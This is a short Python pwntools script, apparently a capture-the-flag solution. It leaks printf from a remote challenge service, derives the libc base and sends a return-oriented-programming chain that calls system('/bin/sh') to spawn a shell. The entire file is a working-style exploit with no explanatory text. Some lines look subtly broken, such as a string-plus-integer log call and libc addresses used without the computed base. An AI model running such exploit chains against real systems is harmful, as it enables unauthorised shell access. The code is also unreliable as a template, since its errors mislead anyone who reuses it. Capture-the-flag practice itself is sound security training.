from pwn import *
context.log_level = 'critical'
context.arch = "amd64"

e = context.binary = ELF("chall")

# r= e.process()
# lib = e.libc

lib = ELF('./libc.so.6')
r = remote("chal-lz56g6.wanictf.org", 9005)

r.recvuntil(b'= ')
printf = int(r.recvline().strip(), 16)
base_libc = printf - lib.sym.printf

info("printf: %x" + printf)
info("base libc: " + hex(base_libc))

pop_rdi_ret = base_libc + 0x000000000010f75b
ret = pop_rdi_ret+1
binsh_libc = next(lib.search(b'/bin/sh'))

for i in range(3):
    r.sendlineafter(b': ', b'a')
    r.sendlineafter(b': ', b'1')
    r.sendlineafter(b': ', b'2')

payload = flat(pop_rdi_ret, binsh_libc, ret, lib.sym.system, 5)

r.sendline(payload)
r.sendline(b'-')
r.sendline(b'-') 

r.interactive()
